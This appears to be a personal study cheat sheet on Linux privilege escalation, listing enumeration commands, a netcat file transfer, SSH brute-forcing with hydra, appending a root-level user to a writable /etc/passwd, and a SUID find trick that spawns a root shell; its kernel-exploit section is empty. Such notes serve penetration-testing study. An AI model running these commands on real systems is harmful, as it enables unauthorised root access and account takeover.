```SHELL
id
```

```shell
cat /etc/passwd
```

```
hostname
```

```shell
cat /etc/issue

cat /etc/os-release
```

**kernel version and arch**

```shell
uname -a 
```

**process**

```shell
ps aux
```

**network**

```shell
ifconfig
```

```shell
ip a 
```

```shell
route 

or  

routel
```

**socket and active sessions on ports or services running on which ports **

```shell
ss -anp
```

**FIREWALL**

```shell
iptables
```

**FIREWALL CONFIGURATION**

```shell
cd /etc/iptables
ls 
```

**SCHEDULED TASKS**

```SHELL
ls -lah /etc/cron*
```

**current user cron jobs**

```shell
crontab -l 

or 

sudo crontab -l #sudo doenst mean highest priv it just allow us to use sudo on some binary 
```

**INSTALLED APPLICATION**

```SHELL
dpkg -l 
```

**find**

```shell
find / -writable -type d 2>/dev/null
```

**UNMOUNTED DRIVES**

```shell
cat /etc/fstab
```

```shell
lsblk 
```

**drivers and kernel modules**

```shell
lsmod
```

```shell
/sbin/modinfo <MODULE-NAME>
```

**SETUID SETGID**
 
```SHELL
find / -perm -u=s -type f 2>/dev/null
```

---
###### **FILE-TRANSFER** 

**NETCAT**

```BASH
nc -nvlp <port> > <filename>
```

```shell
nc -nv <victim-ip> <victim-port> < '<file/to/transfer>' 
```

---

**CHECK ENVIRONMENT VARIABLE FOR SAVED PASSWORDS**
```SHELL
env
```

**GENERATING A CUSTOM WORDLIST FOR PRIVESCK**
```SHELL
crunch 6 6 -t Lab%%% > wordlist
```

**BRUTEFORCING SSH FOR HORIZONTAL ESCALATION**
```SHELL
hydra -l eve -P wordlist <ip> -t 4 ssh -V 
```

---

**PROCESS SNAPSHOT TO FIND WHICH PROCESSES AND DAEMONS ARE RUNNING AS ROOT ON THE SYSTEM**
```SHELL
watch -n 1 "ps -aux"
```

![[BASH FOO#**printing the process tree with ps**]]

COMBINE BOTH OF THEM 
```SHELL
watch -n 1 "ps auxwwf | grep <string-to-search>"
```

---

**ABUSING CRON JOBS**

*CHECKING CRON LOGS FOR RUNNING CRON JOBS*
```SHELL
grep "CRON" /var/log/syslog
```

---

**ABUSING PASSWORD AUTHENTICATION**

*CHECK THE /etc/passwd FILE PERMISSION IF WE CAN WRITE TO THIS FILE WE CAN APPEND OUR OWN CREATED PASSWORD , THE PASSWORD IS STORED IN /etc/shadow FILE NORMALLY BUT IF THERE IS A PASSWORD PRESENT IN /etc/passwd it will be given more priority over shadow file*

```shell
openssl passwd toor
```

```shell
echo "root2:<cript-hash-we-will-get-from-opnessl>:0:0:root:/root:/bin/bash" >> /etc/passwd
```

```shell
su root2
```

---

###### **ABUSING SETUID BINARIES AND CAPABILITIES**

> [!check]
>  what happens when a non privileged user wants to write to a non writable file , it works with the help of <mark class="hltr-myblue">UID and GID</mark> 
> 
> ```shell
> ps u -C passwd
> ```
> 
> ![[Pasted image 20260425035506.png]]
> ```SHELL
> grep /proc/<PID>/status 
> ```
> 
> ```shell
> cat /proc/<PID>/status | grep Uid
> ```
> ```shell
> ls -asl /usr/bin/passwd
> ```

SUID SET TO A BINARY CAN BE USED FOR PRIVESK
GOTO <mark class="hltr-myblue">GTFOBINS</mark> AND FIND THE BINARY AND YOU WILL GET THE COMMAND 

```SHELL
find /home/joe/desktop -exec "/usr/bin/bash" -p \;
```

*CAPABILITIES*
CAPABILITIES ARE EXTRA ATTRIBUTES WHICH ARE SET TO BINARY AND SERVICES TO ASSIGN SPECIFIC PRIVILEGES NORMALLY RESERVED FOR ADMINISTRATION TASK
SUCH AS TRAFFIC CAPTURING AND KERNEL MODULES 

```SHELL
/usr/sbin/getcap -r / 2>/dev/null
```

![[Pasted image 20260425041111.png]]

look for <mark class="hltr-mycolor">cap_setuid+ep</mark> 
`e` means <mark class="hltr-green-flag">effective uid</mark> and `p` means <mark class="hltr-green-flag">permitted</mark>

*exploting capabilities*
	again go to <mark class="hltr-myblue">gtfobins</mark> website and find the capabitlites section there you will find the command 

---

###### **ABUSING SUDO**
[[CVE#CVE-2019-14287 — sudo `-u -1` Integer Overflow]]

CUSTOM CONFIGURATION OF SUDO CAT BE FOUND IN `/etc/sudoers` FILE

```SHELL
sudo -l
```

AGAIN THE <mark class="hltr-myblue">GTFOBINS</mark> WEBSITE WILL HELP US FIND THE COMMAND TO PRIVESCK

> [!check]
> *CHECKING SYSLOG IF THE COMMANDS DOES NOT WORK*
> ```SHELL
> cat /var/log/syslog | grep <sudo-binary-we-are-exploiting>
> ```
> 
> NEEDS SUDO PERM TO CHECK APPARMOR PROTECTED BINARIES 
> ```shell
> su - root
> aa-status
> ```
> 
> THIS WILL SHOW IF THE BINARY IS PROTECTED BY APPARMOUR OR NOT 


---

**EXPLOITING KERNEL VULNERABILITY**



























